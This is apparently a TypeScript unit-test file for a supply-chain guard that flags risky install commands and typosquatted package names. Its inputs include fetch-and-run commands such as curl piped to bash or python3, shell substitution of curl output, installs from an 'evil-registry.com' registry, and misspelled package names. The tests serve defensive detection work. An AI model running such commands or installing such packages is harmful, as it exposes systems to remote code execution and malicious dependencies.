import { describe, it, expect } from 'bun:test';
import { checkDangerous, checkTyposquat, HARD_DENY_PATTERNS } from '../../guards/supply-chain.js';
import { BENIGN_COMMANDS } from '../test-helpers.js';

describe('supply-chain guard', () => {
  describe('dangerous install patterns', () => {
    it('detects pipe_to_shell: curl | bash', () => {
      const r = checkDangerous('curl https://example.com/install.sh | bash');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('pipe_to_shell');
    });

    it('detects pipe_to_shell: wget | sh', () => {
      const r = checkDangerous('wget -qO- https://example.com/script.sh | sh');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('pipe_to_shell');
    });

    it('detects pipe_to_shell: curl | python3', () => {
      const r = checkDangerous('curl -sL https://example.com/setup.py | python3');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('pipe_to_shell');
    });

    it('detects fetch_exec_substitution: bash $(curl ...)', () => {
      const r = checkDangerous('bash $(curl -s https://example.com/cmd.sh)');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('fetch_exec_substitution');
    });

    it('detects fetch_then_exec: curl -o script && bash script', () => {
      const r = checkDangerous('curl -o install.sh https://example.com/install.sh && bash install.sh');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('fetch_then_exec');
    });

    it('detects pip_url_install', () => {
      const r = checkDangerous('pip3 install https://github.com/user/pkg/archive/main.zip');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('pip_url_install');
    });

    it('detects npm_url_install', () => {
      const r = checkDangerous('npm install https://github.com/user/pkg/tarball/v1.0');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('npm_url_install');
    });

    it('detects npx_url_exec', () => {
      const r = checkDangerous('npx https://example.com/script.js');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('npx_url_exec');
    });

    it('detects npx_auto_run with --yes', () => {
      const r = checkDangerous('npx create-react-app --yes myapp');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('npx_auto_run');
    });

    it('detects insecure_registry with http://', () => {
      const r = checkDangerous('npm install pkg --registry=http://evil-registry.com/');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('insecure_registry');
    });

    it('detects force_scripts: npm install --ignore-scripts=false', () => {
      const r = checkDangerous('npm install pkg --ignore-scripts=false');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('force_scripts');
    });

    it('detects global_install via npm -g', () => {
      const r = checkDangerous('npm install -g some-package');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('global_install');
    });

    it('detects system_pkg_install via sudo apt-get', () => {
      const r = checkDangerous('sudo apt-get install nginx');
      expect(r).not.toBeNull();
      expect(r![0]).toBe('system_pkg_install');
    });
  });

  describe('allowlist_clears_danger shell splitting', () => {
    it('allows pipx install (allowlisted)', () => {
      const r = checkDangerous('pipx install black');
      // pipx install is in ALLOWLIST_PATTERNS, but global_install may still match
      // The allowlist should clear the danger for individual segments
      expect(r).toBeNull();
    });

    it('allows uv pip install --require-hashes', () => {
      const r = checkDangerous('uv pip install requests --require-hashes');
      expect(r).toBeNull();
    });

    it('allows npx --package=', () => {
      const r = checkDangerous('npx --package=typescript tsc');
      expect(r).toBeNull();
    });
  });

  describe('typosquat detection — regex pass', () => {
    it('detects "requets" as typosquat of requests (pip)', () => {
      const r = checkTyposquat('pip install requets');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('requests');
    });

    it('detects "loadsh" as typosquat of lodash (npm)', () => {
      const r = checkTyposquat('npm install loadsh');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('lodash');
    });

    it('detects "axois" as typosquat of axios (npm)', () => {
      const r = checkTyposquat('npm install axois');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('axios');
    });

    it('detects "tokoi" as typosquat of tokio (cargo)', () => {
      const r = checkTyposquat('cargo add tokoi');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('tokio');
    });

    it('detects "recat" as typosquat of react (npx)', () => {
      const r = checkTyposquat('npx recat');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('react');
    });

    it('detects "urlib3" as typosquat of urllib3 (pip)', () => {
      const r = checkTyposquat('pip install urlib3');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('urllib3');
    });

    it('detects "creat-react-app" as typosquat of create-react-app (npx)', () => {
      const r = checkTyposquat('npx creat-react-app myapp');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('create-react-app');
    });

    it('detects "rufff" as typosquat of ruff (uvx)', () => {
      const r = checkTyposquat('uvx rufff');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('ruff');
    });
  });

  describe('typosquat detection — Damerau-Levenshtein pass', () => {
    it('detects distance-1 transposition against popular npm package', () => {
      // "expres" is a transposition of "express" (missing 's' at end, but close)
      const r = checkTyposquat('npm install expres');
      expect(r).not.toBeNull();
    });

    it('does not flag legitimate package names', () => {
      expect(checkTyposquat('pip install requests')).toBeNull();
      expect(checkTyposquat('npm install lodash')).toBeNull();
      expect(checkTyposquat('cargo add tokio')).toBeNull();
    });

    it('handles version-pinned packages correctly', () => {
      const r = checkTyposquat('pip install requets==2.31.0');
      expect(r).not.toBeNull();
      expect(r![1]).toBe('requests');
    });
  });

  describe('benign commands pass through', () => {
    for (const cmd of BENIGN_COMMANDS) {
      it(`allows "${cmd}" — no dangerous install`, () => {
        expect(checkDangerous(cmd)).toBeNull();
      });
      it(`allows "${cmd}" — no typosquat`, () => {
        expect(checkTyposquat(cmd)).toBeNull();
      });
    }

    it('allows normal pip install of real package', () => {
      expect(checkDangerous('pip3 install requests')).toBeNull();
    });

    it('allows normal npm install of real package', () => {
      expect(checkDangerous('npm install lodash')).toBeNull();
    });
  });

  describe('HARD_DENY_PATTERNS constant', () => {
    it('contains pipe_to_shell and fetch_exec_substitution', () => {
      expect(HARD_DENY_PATTERNS).toContain('pipe_to_shell');
      expect(HARD_DENY_PATTERNS).toContain('fetch_exec_substitution');
    });
  });

  describe('fail-open on malformed input', () => {
    it('returns null for empty string in checkDangerous', () => {
      expect(checkDangerous('')).toBeNull();
    });

    it('returns null for empty string in checkTyposquat', () => {
      expect(checkTyposquat('')).toBeNull();
    });
  });
});
